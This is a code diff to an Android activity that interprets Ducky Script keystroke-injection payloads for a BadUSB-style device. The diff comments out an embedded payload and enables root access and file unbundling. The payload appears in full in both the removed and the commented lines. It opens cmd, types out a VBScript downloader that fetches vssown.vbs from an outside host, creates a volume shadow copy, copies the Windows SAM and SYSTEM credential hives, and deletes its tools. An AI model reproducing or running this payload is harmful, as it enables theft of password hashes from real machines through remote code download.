@@ -25,8 +25,6 @@ public class InterpreterActivity extends AppCompatActivity implements View.OnCli
 
         script_path = getIntent().getStringExtra("script_path");
 
-        unbundle_file();
-
         test = findViewById(R.id.btn_int);
         test.setOnClickListener(this);
     }
@@ -89,68 +87,69 @@ public class InterpreterActivity extends AppCompatActivity implements View.OnCli
     }
 
     private void test_int() {
-        //request_root_access();
+        request_root_access();
+        unbundle_file();
         String folder = "C:/Users/amg";
-        ArrayList<String> script = new ArrayList<>(Arrays.asList(
-                "DEFAULTDELAY 300",
-                "ALT F4",
-                "ESCAPE",
-                "CONTROL ESCAPE",
-                "DELAY 400",
-                "STRING cmd",
-                "DELAY 400",
-                "ENTER",
-                "DELAY 400",
-                "STRING cd {{%folder}}",
-                "ENTER",
-                "DELAY 200",
-                "STRING copy con download.vbs",
-                "ENTER",
-                "STRING Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))",
-                "ENTER",
-                "STRING Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()",
-                "ENTER",
-                "STRING If objXMLHTTP.Status = 200 Then",
-                "ENTER",
-                "STRING Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open",
-                "ENTER",
-                "STRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0",
-                "ENTER",
-                "STRING Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a",
-                "ENTER",
-                "STRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing ",
-                "ENTER",
-                "STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing",
-                "ENTER",
-                "CTRL z",
-                "ENTER",
-                "STRING cscript download.vbs http://tools.lanmaster53.com/vssown.vbs",
-                "ENTER",
-                "DELAY 800",
-                "STRING del download.vbs",
-                "ENTER",
-                "DELAY 800",
-                "STRING cscript vssown.vbs /start",
-                "ENTER",
-                "DELAY 800",
-                "STRING cscript vssown.vbs /create",
-                "ENTER",
-                "DELAY 800",
-                "STRING copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\SAM .",
-                "ENTER",
-                "DELAY 800",
-                "STRING copy \\\\?\\\\GLoBALROOT\\Device\\HarddriskVolumeShadowCopy1\\windows\\system32\\config\\SYSTEM .",
-                "ENTER",
-                "DELAY 800",
-                "STRING cscript vssown.vbs /stop",
-                "ENTER",
-                "DELAY 800",
-                "STRING del vssown.vbs",
-                "ENTER",
-                "STRING exit",
-                "ENTER",
-                "REM Make sure to change the DIRECTORY above."
-        ));
+//        ArrayList<String> script = new ArrayList<>(Arrays.asList(
+//                "DEFAULTDELAY 300",
+//                "ALT F4",
+//                "ESCAPE",
+//                "CONTROL ESCAPE",
+//                "DELAY 400",
+//                "STRING cmd",
+//                "DELAY 400",
+//                "ENTER",
+//                "DELAY 400",
+//                "STRING cd {{%folder}}",
+//                "ENTER",
+//                "DELAY 200",
+//                "STRING copy con download.vbs",
+//                "ENTER",
+//                "STRING Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))",
+//                "ENTER",
+//                "STRING Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()",
+//                "ENTER",
+//                "STRING If objXMLHTTP.Status = 200 Then",
+//                "ENTER",
+//                "STRING Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open",
+//                "ENTER",
+//                "STRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0",
+//                "ENTER",
+//                "STRING Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a",
+//                "ENTER",
+//                "STRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing ",
+//                "ENTER",
+//                "STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing",
+//                "ENTER",
+//                "CTRL z",
+//                "ENTER",
+//                "STRING cscript download.vbs http://tools.lanmaster53.com/vssown.vbs",
+//                "ENTER",
+//                "DELAY 800",
+//                "STRING del download.vbs",
+//                "ENTER",
+//                "DELAY 800",
+//                "STRING cscript vssown.vbs /start",
+//                "ENTER",
+//                "DELAY 800",
+//                "STRING cscript vssown.vbs /create",
+//                "ENTER",
+//                "DELAY 800",
+//                "STRING copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\SAM .",
+//                "ENTER",
+//                "DELAY 800",
+//                "STRING copy \\\\?\\\\GLoBALROOT\\Device\\HarddriskVolumeShadowCopy1\\windows\\system32\\config\\SYSTEM .",
+//                "ENTER",
+//                "DELAY 800",
+//                "STRING cscript vssown.vbs /stop",
+//                "ENTER",
+//                "DELAY 800",
+//                "STRING del vssown.vbs",
+//                "ENTER",
+//                "STRING exit",
+//                "ENTER",
+//                "REM Make sure to change the DIRECTORY above."
+//        ));
 //        for(int i = 0; i < 1000; i++) {
 //            script.add("STRING 0x" + Integer.valueOf(String.valueOf(i), 16));
 //            script.add("ENTER");
@@ -254,7 +253,29 @@ public class InterpreterActivity extends AppCompatActivity implements View.OnCli
 //                "STRING Ampersand: &", "ENTER",
 //                "STRING Star: *", "ENTER"
 //                ));
-        Interpreter interpreter = new Interpreter(script, script_path);
-        interpreter.run();
+//        ArrayList<String> script = new ArrayList<String>(Arrays.asList(
+//                "REM Simple Hello World Script",
+//                "GUI r",
+//                "DELAY 400",
+//                "STRING notepad.exe",
+//                "ENTER",
+//                "DELAY 500",
+//                "ALT o",
+//                "DELAY 100",
+//                "STRING f",
+//                "DELAY 200",
+//                "TAB",
+//                "TAB",
+//                "STRING 24",
+//                "ENTER",
+//                "DELAY 100",
+//                "STRING Hello World!",
+//                "ENTER",
+//                "ENTER",
+//                "STRING This is a test :)",
+//                "ENTER"
+//        ));
+//        Interpreter interpreter = new Interpreter(script, script_path);
+//        interpreter.run();
     }
 }
